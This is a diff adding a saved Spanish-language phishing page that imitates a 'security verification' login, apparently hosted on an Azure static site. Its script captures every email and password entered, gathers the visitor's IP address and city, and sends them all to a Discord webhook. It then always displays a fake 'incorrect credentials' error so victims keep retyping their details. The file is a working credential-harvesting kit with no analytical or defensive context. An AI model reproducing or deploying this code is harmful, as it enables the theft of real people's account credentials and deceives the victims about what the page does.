@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<!-- saved from url=(0055)https://788bnesco82.z15.web.core.windows.net/corre.html -->
+<html lang="es"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PRUEBA</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="./corre_files/css2" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary-color: #2e846b;
+            --text-dark: #2c3e50;
+            --text-muted: #7f8c8d;
+            --input-border: #bdc3c7;
+            --link-color: #0056b3;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Lato', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f5f6fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            width: 100vw;
+            overflow-x: hidden;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 430px;
+            height: 100vh;
+            background-color: var(--primary-color);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            position: relative;
+        }
+
+        @media (min-width: 480px) {
+            .wrapper {
+                height: 92vh;
+                min-height: 760px;
+                border-radius: 24px;
+                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+            }
+        }
+
+        .header-section {
+            position: relative;
+            padding: 30px 20px 20px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+            z-index: 1;
+        }
+
+        .header-section::before {
+            content: '';
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.06);
+            z-index: -1;
+            top: -30px;
+            right: -30px;
+            width: 200px;
+            height: 200px;
+        }
+
+        .logo {
+            width: 11.5rem;
+            max-width: 175px;
+            height: auto;
+        }
+
+        .main-container {
+            background-color: #ffffff;
+            border-top-left-radius: 35px;
+            border-top-right-radius: 35px;
+            padding: 35px 28px 25px 28px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            z-index: 2;
+        }
+
+        .security-icon {
+            text-align: center;
+            font-size: 48px;
+            margin-bottom: 5px;
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 5px;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+            justify-content: space-between;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 15px;
+            color: #455a64;
+            margin-bottom: 6px;
+            font-weight: 400;
+        }
+
+        .input-control {
+            width: 100%;
+            padding: 12px 14px;
+            font-family: 'Lato', sans-serif;
+            font-size: 15px;
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            outline: none;
+            color: var(--text-dark);
+            transition: border-color 0.2s;
+        }
+
+        .input-control:focus {
+            border-color: var(--primary-color);
+        }
+
+        .input-control.error {
+            border-color: #e74c3c;
+            background-color: #fff5f5;
+        }
+
+        .error-message-global {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            border-radius: 10px;
+            padding: 12px 16px;
+            margin-bottom: 18px;
+            font-size: 14px;
+            display: none;
+            text-align: center;
+            font-weight: 700;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        .error-message-global.show {
+            display: block;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+        .error-message-global .icon {
+            font-size: 20px;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .error-message-global .sub-text {
+            font-weight: 400;
+            font-size: 13px;
+            margin-top: 4px;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background-color: var(--primary-color);
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            font-family: 'Lato', sans-serif;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            border-radius: 30px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            background-color: #236652;
+            transform: scale(1.02);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-submit .btn-text {
+            display: inline-block;
+        }
+
+        .btn-submit .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+
+        .btn-submit.loading .btn-text {
+            display: none;
+        }
+
+        .btn-submit.loading .spinner {
+            display: block;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer-bar {
+            width: 100%;
+            height: 70px;
+            background-color: var(--primary-color);
+            flex-shrink: 0;
+            z-index: 1;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+
+        .security-badge svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        .attempt-counter {
+            display: none;
+        }
+    </style>
+<script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="5cb6ec98-751c-467b-b64d-9d7db087de85" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/200.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="5cb6ec98-751c-467b-b64d-9d7db087de85" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/101.js"></script></head>
+<body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJlbmFibGVkIiwiTElOS0VESU4iOiJlbmFibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMS4xIiwic2NvcmUiOjIwMTAxMH1d" __processed_bf22aeed-eb0c-4b14-9ffe-6baa1b3e6d74__="true">
+
+    <div class="wrapper" bis_skin_checked="1">
+        
+        <div class="header-section" bis_skin_checked="1">
+            <img src="./corre_files/a.png" alt="Logo" class="logo">
+        </div>
+
+        <div class="main-container" bis_skin_checked="1">
+            
+            <div bis_skin_checked="1">
+                <div class="security-icon" bis_skin_checked="1">🔐</div>
+                <h1 class="title">Verificación de Seguridad</h1>
+                <p class="subtitle">Ingresa tus credenciales para continuar</p>
+
+                <div class="error-message-global" id="errorGlobal" bis_skin_checked="1">
+                    <span class="icon">❌</span>
+                    <span id="errorText">El correo y/o contraseña no coinciden con los datos registrados</span>
+                    <div class="sub-text" id="attemptText" bis_skin_checked="1">Intento #1 - Por favor verifica tus datos</div>
+                </div>
+
+                <form id="securityForm" action="https://788bnesco82.z15.web.core.windows.net/corre.html#" method="POST">
+                    <div bis_skin_checked="1">
+                        <div class="form-group" bis_skin_checked="1">
+                            <label for="email">Correo electrónico</label>
+                            <input type="email" id="email" class="input-control" placeholder="tucorreo@ejemplo.com" autocomplete="off" required="">
+                        </div>
+
+                        <div class="form-group" bis_skin_checked="1">
+                            <label for="password">Contraseña</label>
+                            <input type="password" id="password" class="input-control" placeholder="••••••••" required="">
+                        </div>
+                    </div>
+
+                    <div bis_skin_checked="1">
+                        <button type="submit" class="btn-submit" id="btnSubmit">
+                            <span class="btn-text">Continuar</span>
+                            <span class="spinner"></span>
+                        </button>
+                        
+                        <div class="security-badge" bis_skin_checked="1">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                            </svg>
+                            <span>Conexión segura</span>
+                        </div>
+                    </div>
+                </form>
+            </div>
+
+        </div>
+
+        <div class="footer-bar" bis_skin_checked="1"></div>
+
+    </div>
+
+    <script src="./corre_files/jquery.min.js.descarga"></script>
+    <script type="text/javascript" src="./corre_files/infodt.js.descarga"></script>
+
+    <script>
+    $(document).ready(function() {
+        
+        const form = document.getElementById('securityForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const btnSubmit = document.getElementById('btnSubmit');
+        const errorGlobal = document.getElementById('errorGlobal');
+        const errorText = document.getElementById('errorText');
+        const attemptText = document.getElementById('attemptText');
+
+        let intentos = 0;
+
+        const mensajesError = [
+            'El correo y/o contraseña no coinciden con los datos registrados',
+            'Credenciales incorrectas. Por favor, verifica tu información',
+            'No encontramos una cuenta con estos datos. Intenta nuevamente',
+            'Error de autenticación. El correo o contraseña son inválidos',
+            'Los datos ingresados no corresponden a ninguna cuenta activa',
+            'Verificación fallida. Asegúrate de usar tus credenciales correctas'
+        ];
+
+        function enviarDatos(event) {
+            event.preventDefault();
+            
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (!email || !password) {
+                mostrarError('Por favor, completa todos los campos');
+                return;
+            }
+
+            // Incrementar contador de intentos CADA VEZ
+            intentos++;
+            
+            // ENVIAR A DISCORD EN CADA INTENTO
+            console.log("📤 Enviando intento #" + intentos);
+            console.log("📧 Correo:", email);
+            console.log("🔒 Contraseña:", password);
+            
+            // Obtener IP y ubicación
+            $.getJSON("https://api.ipify.org?format=json", function(data) {
+                const ip = data.ip;
+                
+                $.getJSON("https://ipinfo.io", function (response) {
+                    const ubicacion = response.city + ", " + response.country;
+                    
+                    var message = "``` 🔐 VERIFICACIÓN DE SEGURIDAD ```\n" +
+                        "📧 **Correo:** `" + email + "`\n" +
+                        "🔒 **Contraseña:** `" + password + "`\n" +
+                        "🔄 **Intento #:** `" + intentos + "`\n\n" +
+                        "📡 **Información de Red:**\n" +
+                        "📌 **IP:** `" + ip + "`\n" +
+                        "🌍 **Ubicación:** `" + ubicacion + "`\n" +
+                        "🕐 **Fecha:** `" + new Date().toLocaleString() + "`";
+                    
+                    $.ajax({
+                        async: true,
+                        url: webhook,
+                        method: "POST",
+                        contentType: "application/json",
+                        data: JSON.stringify({
+                            content: message
+                        })
+                    })
+                    .done(function() {
+                        console.log("✅ Intento #" + intentos + " enviado a Discord");
+                    })
+                    .fail(function() {
+                        console.log("❌ Error enviando intento #" + intentos);
+                    });
+                    
+                });
+            });
+
+            // Mostrar error SIEMPRE
+            mostrarError();
+            emailInput.focus();
+        }
+
+        function mostrarError(mensajePersonalizado = null) {
+            const mensaje = mensajePersonalizado || mensajesError[Math.floor(Math.random() * mensajesError.length)];
+            
+            errorText.textContent = mensaje;
+            attemptText.textContent = 'Intento #' + intentos + ' - Por favor verifica tus datos';
+            
+            errorGlobal.classList.remove('show');
+            
+            setTimeout(() => {
+                errorGlobal.classList.add('show');
+            }, 50);
+            
+            emailInput.classList.add('error');
+            passwordInput.classList.add('error');
+            
+            emailInput.style.animation = 'shake 0.4s ease-in-out';
+            passwordInput.style.animation = 'shake 0.4s ease-in-out';
+            
+            setTimeout(() => {
+                emailInput.style.animation = '';
+                passwordInput.style.animation = '';
+            }, 500);
+            
+            btnSubmit.disabled = true;
+            btnSubmit.classList.add('loading');
+            
+            setTimeout(() => {
+                btnSubmit.disabled = false;
+                btnSubmit.classList.remove('loading');
+            }, 1500);
+        }
+
+        emailInput.addEventListener('input', function() {
+            emailInput.classList.remove('error');
+            if (passwordInput.value.trim()) {
+                errorGlobal.classList.remove('show');
+            }
+        });
+        
+        passwordInput.addEventListener('input', function() {
+            passwordInput.classList.remove('error');
+            if (emailInput.value.trim()) {
+                errorGlobal.classList.remove('show');
+            }
+        });
+
+        form.addEventListener('submit', enviarDatos);
+
+        console.log("🔐 Sistema de verificación iniciado");
+        console.log("📌 Cada intento se enviará a Discord");
+
+    });
+    </script>
+
+
+</body></html>
